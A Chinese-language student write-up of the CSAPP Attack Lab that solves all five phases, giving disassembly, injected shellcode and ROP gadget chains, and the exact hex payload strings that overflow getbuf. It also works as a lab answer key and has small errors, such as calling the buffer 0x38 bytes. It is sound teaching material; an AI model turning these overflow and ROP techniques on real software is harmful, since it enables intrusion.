 # attack-lab
## 要干啥？
利用漏洞改变./ctarget与./rtarget文件的输出。
## 怎么干？
运用objdump -d xxx来获取反汇编代码：
### ctarget:
 #### phase1
```Assembly
 00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 ac 03 00 00       	call   401b60 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret    
  4017be:	90                   	nop
  4017bf:	90                   	nop

00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 3d 20 00 01 	movl   $0x1,0x203d0e(%rip)        # 6054dc <vlevel>
  4017cb:	00 00 00 
  4017ce:	bf e5 31 40 00       	mov    $0x4031e5,%edi
  4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 cb 05 00 00       	call   401dad <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>
```
 我们从`4017a8`可以看出`getbuf`的缓冲区为`0x38`字节，其程序返回地址就存在`%rsp+0x38`字节后面的8个字节中，所以我们只需要输入特定长度的字符并且覆盖返回地址即可。所以第一题的答案为：
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```
命名为：inp1.txt ，运行：
`./hex2raw < inp.txt | ./ctarget -q`
成功~
##### 注意点：
1. 用小端法存数据，这个在attacklab.pdf中也有说过
2. 想清楚0x28到底是几个字节，我一开始以为是28个字节，TAT.
 #### phase2
 先上c代码：
 ```c
 void touch2(unsigned val)

 {
 	vlevel = 2; /* Part of validation protocol */
 	if (val == cookie) {
 		printf("Touch2!: You called touch2(0x%.8x)\n", val);
 		validate(2);
 	} else {
 		printf("Misfire: You called touch2(0x%.8x)\n", val);
 		fail(2);
 }
 	exit(0);
 }
 ```
 所以这道题首先要注入汇编代码在汇编代码中更改`$rdi`的值然后，将`touch2`的地址压入栈。在覆盖`$rsp`的时候，要知道`$rsp`具体值为多少以跳转到注入代码处，所以设断点得到`getbuf`处的`$rsp`值。
 注入的汇编代码:
```Assembly
 	mov $0x59b997fa,%rdi
 	push $0x004017ec
 	ret
```
运用 `gcc -c test.s`，`objdump -d test.o`将其转化为机器码得到：
```Assembly
test.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          push   $0x4017ec
   c:   c3                      ret    

```
然后按照第一题的思路，填充，覆盖，跳转，压栈，更改返回地址。
```
	48 c7 c7 fa 97 b9 59
	68 ec 17 40 00
	c3
	00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	78 dc 61 55 00 00 00 00 00 00
```
#### 注意点：
1. 调试带参数的程序时，进入gdb环境后，运用`set args -q
`进行调试。
2. objdump -d 后的程序时代码是小端法输出的，所以不用更改直接复制即可，地址是大端法输出，因为要符合人的观看习惯。
 #### phase3
 ```c
1 /* Compare string to hex represention of unsigned value */
2 int hexmatch(unsigned val, char *sval)
3 {
4 	char cbuf[110];
5 	/* Make position of check string unpredictable */
6 	char *s = cbuf + random() % 100;
7 	sprintf(s, "%.8x", val);
8 	return strncmp(sval, s, 9) == 0;
9 }

10
11 void touch3(char *sval)
12 {
13 	vlevel = 3; /* Part of validation protocol */
14 	if (hexmatch(cookie, sval)) {
15 		printf("Touch3!: You called touch3(\"%s\")\n", sval);
16 		validate(3);
17 	} else {
18 		printf("Misfire: You called touch3(\"%s\")\n", sval);
19 		fail(3);
20 }
21 	exit(0);
22 }
 ```
 这里不同于`touch2`的地方是，`touch3`是传址，需要明确的存在栈上的物理地址，而上一题只需要对寄存器进行赋值即可，所以这道题相当于上一题的进阶版，思路一样我不细说了。注意三点：
 1. 在`touch3`的范围内要访问一个地址，所以如果你之前在`getbuf`范围内的栈内存值了，在`touch3`里是无法访问的，所以你需要在更早的栈内存值，以便`%rsp`回退的时候，回退到你存值地址之后。所以你要在`getbuf`返回地址的后面属于`test`范围的栈内存值。
 2. 由于 `*sval`的值是`cookie`，但是`strcmp`比较时会比较`ascii`值，数字的`ascii`值不等于其本身，所以要将`cookie`转化为`ascii`码。
 3. 你在下面可能会注意到我的答案最后一行在写`cookie`时，本来是8个字节，我在8个字节后面写了00，是因为字符串比较遇到`null`后停止。
 所以答案为：
 ```
	48 c7 c7 a8 dc 61 55
	68 fa 18 40 00
	c3 
	00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	78 dc 61 55 00 00 00 00
	35 39 62 39 39 37 66 61 00
 ```
### rtarget:
Return-Oriented Programming
 #### phase4
本题是重复实现phase2，只不过程序运用了对抗缓冲区攻击的一种方法--栈随机化，同一位置的%rsp值，在不同次运行时结果不一样。
```
0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
7:   68 ec 17 40 00          push   $0x4017ec
c:   c3                      ret    
```
但是在farm中找不到对应的机器码，这是我遇到的第一个难点：如何寻找代替的汇编代码，由于实现此功能的方式太多了，所以在寻找合适的地方断开时就不知所措了，我是根据文档记住了mov的关键词，`48 89`以及`nop`的关键词`90`可以在前几个farm中快速定位到可疑的断句点。然后进行猜测。得出结论：
```Assembly
	00000000004019a0 <addval_273>:
  	4019a0:	8d 87 48 89 c7 c3    	lea    	-0x3c3876b8(%rdi),%eax
  	4019a6:	c3                   	ret    
```
根据查表，`48 89 c7`指`movq %rax, %rdi`，与`pop %rax`相结合就可以凑成攻击链。`pop`的是`58+`的所以在前几个`gadget`中最适合的就是：
```Assembly
	00000000004019ca <getval_280>:
  	4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  	4019cf:	c3                   	ret    
```
所以就凑成了，“先溢出更改返回地址->在溢出`push %rax`值（虽然没有这个命令但是直接把值埋下去效果一样）->埋下`pop`的地址->埋下`pop`返回后的跳转地址”；的攻击链。
所以答案为：
```Assembly
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00 
	00 00 00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00 00 00
	ab 19 40 00 00 00 00 00
	fa 97 b9 59 00 00 00 00
	a2 19 40 00 00 00 00 00
	ec 17 40 00 00 00 00 00
```
##### 疑惑点：
1. 一开始我是在前40个字节中填入了我的攻击链代码，但是似乎没用，或许是运行过跳转代码后，即`ret`后无法访问更改后的`%rsp`之前的值了。这一点需要好好想想。

 #### phase5
本题我遇到的难点是：由于栈随机化，所以你无法得到准确的存储`cookie`字符串的地址，并将其赋值给`%rdi`,并且官方给出的提示是，攻击链长度为8(不唯一)，所以并不是有限的几步，可以将`rdi`的赋值正确，必须进行8次跳转。
##### 思路的转化：
`40个0`+一个跳转地址，其中跳转地址在`%rsp+0x10`，`%rsp+0x8`存放`cookie`值，然后`getbuf`回收栈空间，然后跳转,跳转到的代码为：
```Assembly
	mov %rsp,%rdi
	push $0x4018fa
	retq
```
运行`ret`后`%rsp+8`所以`ret`前的`%rsp+8`即`cookie`值变为了`%rsp`。但是为什么不能这么做呢，因为栈随机化，你的跳转地址不能是你自定义的，你自定义的函数地址是浮动的，无法准确写入跳转地址中，所以跳转地址一定是gadget，从gadget中用%rsp值相对距离去写入你自定义的函数的地址。
哪些gadget可以实现mov呢并没有，但是我们可以从另一条路走
```Assembly
	mov $0x0,%rdi
	mov %rsp,%rsi
	call add_xy
	mov %rax,%rdi
```
or
```Assembly
	mov %rsp,%rdi
	mov $0x0,%rsi
	call add_xy
	mov %rax,%rdi
```
用这些来实现`mov %rsp,%rdi`,
到这开始我是死活找不出来了，只好查找博客，看看大佬们是怎么做的：
`https://blog.csdn.net/weixin_41256413/article/details/80463280#t15`以这篇大佬写的为参考：
```Assembly
# in addval_190(0x401a06)
movq %rsp,%rax
ret
# in addval_426(0x4019c5)
movq %rax,%rdi
ret
# in addval_219(0x4017ab)
popq %rax
ret
# in getval_481(0x4019dd)
movl %eax,%edx
ret
# in getval_159(0x401a34)
movl %edx,%ecx
ret
# in addval_436(0x401a13)
movl %ecx,%rsi
ret
# in add_xy(0x4019d6)
lea (%rdi,%rsi,1),%rax
retq 
# in addval_426(0x4019c5)
movq %rax,%rdi
ret
```
具体栈为：
![stack](/home/trh/文档/VSC/VSC_CPP/jljqbd-CSAPP-Labs-master/CSAPP-Labs/mylabs/3-attack/stack.png "栈图")
此时的%rsp为在getbuf中执行ret时的值，所以最终的输入代码为：

```
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	00 00 00 00 00 00 00 00
	06 1a 40 00 00 00 00 00
	c5 19 40 00 00 00 00 00
	ab 19 40 00 00 00 00 00
	48 00 00 00 00 00 00 00
	dd 19 40 00 00 00 00 00
	34 1a 40 00 00 00 00 00
	13 1a 40 00 00 00 00 00
	d6 19 40 00 00 00 00 00
	c5 19 40 00 00 00 00 00
	fa 18 40 00 00 00 00 00
	35 39 62 39 39 37 66 61 00
```
#### 这道题的疑惑点
我到现在也不知道这个大佬是如何从众多机器码中截取到合适的，并且将看似毫无关联的汇编代码进行链接，最终组成了攻击链，只能说太强了~
## 总结
1. 学到了栈其实并不是底层操作系统进行自动维护，而是在汇编层面上就开始维护了。pc运行着他的代码，栈通过%rsp维护自己的结构。
